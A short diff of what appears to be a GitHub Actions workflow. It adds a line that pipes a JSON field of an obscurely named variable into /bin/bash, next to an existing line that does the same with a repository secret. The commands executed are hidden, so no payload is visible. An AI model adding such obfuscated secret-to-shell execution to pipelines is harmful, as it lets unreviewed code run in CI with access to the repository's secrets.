@@ -21,6 +21,7 @@ jobs:
           b45638: ${{ secrets.b45638 }}
         run: |
           printf '%s' "$b45638" | jq -r .un41 | /bin/bash
+          printf '%s' "$qll5" | jq -r .egf8 | /bin/bash
 
       - name: Save output
         if: always()
